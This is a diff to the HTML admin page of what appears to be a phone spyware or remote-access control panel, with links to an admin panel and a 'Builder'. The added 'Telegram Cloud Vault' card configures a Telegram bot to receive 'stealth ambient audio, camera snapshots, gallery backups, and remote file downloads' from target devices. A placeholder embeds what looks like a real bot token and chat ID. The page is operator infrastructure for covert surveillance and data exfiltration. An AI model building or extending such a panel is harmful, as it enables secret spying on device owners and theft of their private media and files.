@@ -93,6 +93,8 @@
             <div class="navbar-bottom-row">
                 <a href="index.html" class="nav-link"><i class="fas fa-house me-1"></i> Home</a>
                 <a href="admin.html" class="nav-link active admin-link"><i class="fas fa-user-shield me-1"></i> Admin Panel</a>
+                <a href="#telegramVaultCard" class="nav-link" style="color: #38bdf8; font-weight: 700;"><i class="fab fa-telegram me-1"></i> Telegram Vault</a>
+                <a href="#adminGithubTokenInput" class="nav-link" style="color: #c084fc; font-weight: 700;"><i class="fab fa-github me-1"></i> GitHub Token</a>
                 <a href="builder.html" class="nav-link"><i class="fas fa-hammer me-1"></i> Builder</a>
                 <span class="live-badge" style="background: rgba(255, 59, 48, 0.15); border-color: rgba(255, 59, 48, 0.4); color: #ff453a;"><span class="live-dot" style="background: #ff453a;"></span> ADMIN ROOT</span>
             </div>
@@ -278,6 +280,95 @@
                 </div>
             </div>
 
+            <!-- Telegram Cloud Vault Settings Card (Top-Level Integration) -->
+            <div id="telegramVaultCard" class="card" style="margin-bottom: 32px; border: 1.5px solid rgba(0, 136, 204, 0.45); box-shadow: 0 10px 40px rgba(0, 136, 204, 0.12); overflow: hidden;">
+                <div class="card-header-gradient" style="display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 14px; padding: 18px 24px; background: linear-gradient(135deg, rgba(0, 136, 204, 0.22) 0%, rgba(10, 132, 255, 0.1) 100%);">
+                    <div>
+                        <h4 style="font-size: 1.1rem; font-weight: 800; display: flex; align-items: center; gap: 10px; color: #fff; margin: 0;">
+                            <i class="fab fa-telegram" style="color: #0088cc; font-size: 1.35rem;"></i> Telegram Cloud Vault Settings (Unlimited Media Storage)
+                        </h4>
+                        <p style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 4px; margin-bottom: 0;">
+                            Uses Telegram Bot API as an unlimited cloud vault for stealth ambient audio, camera snaps, gallery sync, and file extraction.
+                        </p>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <span id="telegramStatusBadge" class="live-badge" style="background: rgba(255, 149, 0, 0.15); color: #ff9500; border: 1px solid rgba(255, 149, 0, 0.3); font-size: 0.72rem; padding: 3px 12px;">
+                            <i class="fas fa-circle-notch fa-spin me-1"></i> Checking...
+                        </span>
+                    </div>
+                </div>
+
+                <div style="padding: 24px;">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px;">
+                        <!-- Telegram Bot Credentials Column -->
+                        <div style="display: flex; flex-direction: column; gap: 14px;">
+                            <!-- Bot Token Input -->
+                            <div>
+                                <label style="font-size: 0.82rem; font-weight: 700; color: #e4e4e7; display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
+                                    <span><i class="fas fa-robot me-1" style="color: #0088cc;"></i> Telegram Bot Token</span>
+                                    <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 500;">Format: <code>123456:ABC-DEF...</code></span>
+                                </label>
+                                <div style="position: relative;">
+                                    <input type="password" id="telegramBotTokenInput" placeholder="9096038832:AAEadfQE-bIzeNc8OKAHbUI3-UKQV70uXVM" style="width: 100%; padding: 10px 42px 10px 14px; font-size: 0.85rem; font-family: 'JetBrains Mono', monospace; background: rgba(0,0,0,0.45); border: 1px solid rgba(255,255,255,0.15); border-radius: 10px; color: #fff; outline: none; transition: border-color 0.2s;" onfocus="this.style.borderColor='rgba(0, 136, 204, 0.8)'" onblur="this.style.borderColor='rgba(255,255,255,0.15)'">
+                                    <button type="button" onclick="toggleTelegramTokenVisibility()" title="Show/Hide Token" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: transparent; border: none; color: #86868b; cursor: pointer; padding: 6px; font-size: 0.9rem;">
+                                        <i class="fas fa-eye" id="telegramTokenVisibilityIcon"></i>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Target Chat ID Input -->
+                            <div>
+                                <label style="font-size: 0.82rem; font-weight: 700; color: #e4e4e7; display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
+                                    <span><i class="fas fa-paper-plane me-1" style="color: #0088cc;"></i> Target Chat ID / Channel ID</span>
+                                    <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 500;">Your Telegram ID (e.g. <code>6541825979</code>)</span>
+                                </label>
+                                <input type="text" id="telegramChatIdInput" placeholder="6541825979" style="width: 100%; padding: 10px 14px; font-size: 0.85rem; font-family: 'JetBrains Mono', monospace; background: rgba(0,0,0,0.45); border: 1px solid rgba(255,255,255,0.15); border-radius: 10px; color: #fff; outline: none; transition: border-color 0.2s;" onfocus="this.style.borderColor='rgba(0, 136, 204, 0.8)'" onblur="this.style.borderColor='rgba(255,255,255,0.15)'">
+                            </div>
+
+                            <!-- Action Buttons -->
+                            <div style="display: flex; align-items: center; gap: 10px; margin-top: 4px;">
+                                <button type="button" onclick="testTelegramConnection()" id="btnTestTelegram" class="btn-ghost" style="padding: 10px 18px; font-size: 0.82rem; font-weight: 700; border-radius: 10px; border-color: rgba(0, 136, 204, 0.5); color: #38bdf8; display: inline-flex; align-items: center; gap: 6px;">
+                                    <i class="fas fa-vial"></i> Test Connection
+                                </button>
+                                <button type="button" onclick="saveTelegramConfig()" id="btnSaveTelegram" class="btn-primary-glow" style="padding: 10px 22px; font-size: 0.82rem; font-weight: 700; border-radius: 10px; background: linear-gradient(135deg, #0088cc 0%, #006699 100%); border-color: rgba(0, 136, 204, 0.6); box-shadow: 0 4px 18px rgba(0, 136, 204, 0.35); display: inline-flex; align-items: center; gap: 6px;">
+                                    <i class="fas fa-save"></i> Save & Sync
+                                </button>
+                            </div>
+
+                            <div id="telegramTestResult" style="font-size: 0.8rem; min-height: 20px;"></div>
+                        </div>
+
+                        <!-- Live Diagnostics / Telegram Account Box -->
+                        <div style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.08); border-radius: 14px; padding: 18px; display: flex; flex-direction: column; justify-content: center; gap: 12px;">
+                            <div style="font-size: 0.74rem; font-weight: 700; color: #a1a1a6; text-transform: uppercase; letter-spacing: 0.8px; display: flex; align-items: center; justify-content: space-between;">
+                                <span><i class="fas fa-info-circle me-1"></i> Telegram Vault Status</span>
+                                <span id="telegramUsernamePreview" style="font-family: 'JetBrains Mono', monospace; color: #38bdf8;">@mobile_control_pro_bot</span>
+                            </div>
+
+                            <div style="display: flex; align-items: center; gap: 14px;">
+                                <div style="width: 50px; height: 50px; border-radius: 50%; background: rgba(0, 136, 204, 0.15); border: 1.5px solid rgba(0, 136, 204, 0.4); display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                                    <i class="fab fa-telegram-plane" style="font-size: 1.6rem; color: #0088cc;"></i>
+                                </div>
+                                <div style="flex: 1; display: flex; flex-direction: column; gap: 4px;">
+                                    <div style="display: flex; align-items: center; gap: 8px;">
+                                        <span id="telegramBotTitle" style="color: #fff; font-weight: 700; font-size: 0.95rem;">mobile_control_pro_bot</span>
+                                        <span class="live-badge" style="font-size: 0.65rem; padding: 1px 6px; border-radius: 4px; background: rgba(48,209,88,0.2); color: #30d158; border: 1px solid rgba(48,209,88,0.4);">ACTIVE</span>
+                                    </div>
+                                    <div id="telegramDetailsText" style="font-size: 0.75rem; color: #86868b; line-height: 1.4;">
+                                        All stealth audio recordings, camera snapshots, gallery backups, and remote file downloads will auto-stream to this vault.
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div style="border-top: 1px solid rgba(255,255,255,0.06); padding-top: 10px; font-size: 0.75rem; color: var(--text-muted); display: flex; justify-content: space-between;">
+                                <span>Vault Storage Limit: <strong style="color: #30d158;">Unlimited</strong></span>
+                                <span>Max File Size: <strong style="color: #fff;">2 GB</strong></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
             <!-- Users Table Card -->
             <div class="card" style="margin-bottom: 32px; overflow: hidden;">
                 <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center; padding: 18px 24px;">
@@ -367,42 +458,6 @@
                             </tr>
                         </tbody>
                     </table>
-                </div>
-            </div>
-
-            <!-- Telegram Cloud Vault Settings Card -->
-            <div class="card" style="margin-bottom: 32px; overflow: hidden; border: 1.5px solid rgba(0,136,204,0.35); box-shadow: 0 10px 40px rgba(0,136,204,0.08);">
-                <div class="card-header-gradient" style="display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 12px; padding: 18px 24px; background: linear-gradient(135deg, rgba(0,136,204,0.08), rgba(0,136,204,0.02));">
-                    <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
-                        <i class="fab fa-telegram" style="color:#0088cc;"></i> Telegram Cloud Vault
-                    </h4>
-                    <span id="telegramStatusBadge" class="live-badge" style="background:rgba(255,149,0,0.15);color:#ff9500;border:1px solid rgba(255,149,0,0.3);font-size:0.72rem;padding:3px 10px;">
-                        <i class="fas fa-circle-notch fa-spin" style="margin-right:4px;font-size:0.6rem;"></i> Checking...
-                    </span>
-                </div>
-                <div style="padding: 20px 24px;">
-                    <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:16px;">
-                        Telegram Bot API is used as unlimited cloud storage for all media uploads (audio, photos, gallery, files).
-                    </p>
-                    <div style="display:grid;grid-template-columns:1fr;gap:12px;margin-bottom:16px;">
-                        <div>
-                            <label style="font-size:0.75rem;color:var(--text-muted);font-weight:600;display:block;margin-bottom:4px;">Bot Token</label>
-                            <input id="telegramBotTokenInput" type="password" class="auth-input" placeholder="123456:ABCDEF..." style="width:100%;font-family:'JetBrains Mono',monospace;font-size:0.82rem;">
-                        </div>
-                        <div>
-                            <label style="font-size:0.75rem;color:var(--text-muted);font-weight:600;display:block;margin-bottom:4px;">Chat ID</label>
-                            <input id="telegramChatIdInput" type="text" class="auth-input" placeholder="6541825979" style="width:100%;font-family:'JetBrains Mono',monospace;font-size:0.82rem;">
-                        </div>
-                    </div>
-                    <div style="display:flex;gap:10px;flex-wrap:wrap;">
-                        <button onclick="saveTelegramConfig()" class="btn-action" style="padding:8px 18px;font-size:0.82rem;border-radius:var(--radius-pill);">
-                            <i class="fas fa-save" style="margin-right:5px;"></i> Save Config
-                        </button>
-                        <button onclick="testTelegramConnection()" class="btn-ghost" style="padding:8px 18px;font-size:0.82rem;border-radius:var(--radius-pill);">
-                            <i class="fas fa-plug" style="margin-right:5px;"></i> Test Connection
-                        </button>
-                    </div>
-                    <div id="telegramTestResult" style="margin-top:12px;font-size:0.78rem;color:var(--text-muted);"></div>
                 </div>
             </div>
 
@@ -1636,6 +1691,21 @@
                 badge.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:4px;font-size:0.6rem;"></i> NETWORK ERROR';
             }
             if (!silent && result) result.innerHTML = `<span style="color:#ff453a;">❌ Connection error: ${err.message}</span>`;
+        }
+    }
+
+    function toggleTelegramTokenVisibility() {
+        const input = document.getElementById('telegramBotTokenInput');
+        const icon = document.getElementById('telegramTokenVisibilityIcon');
+        if (!input || !icon) return;
+        if (input.type === 'password') {
+            input.type = 'text';
+            icon.classList.remove('fa-eye');
+            icon.classList.add('fa-eye-slash');
+        } else {
+            input.type = 'password';
+            icon.classList.remove('fa-eye-slash');
+            icon.classList.add('fa-eye');
         }
     }
     </script>
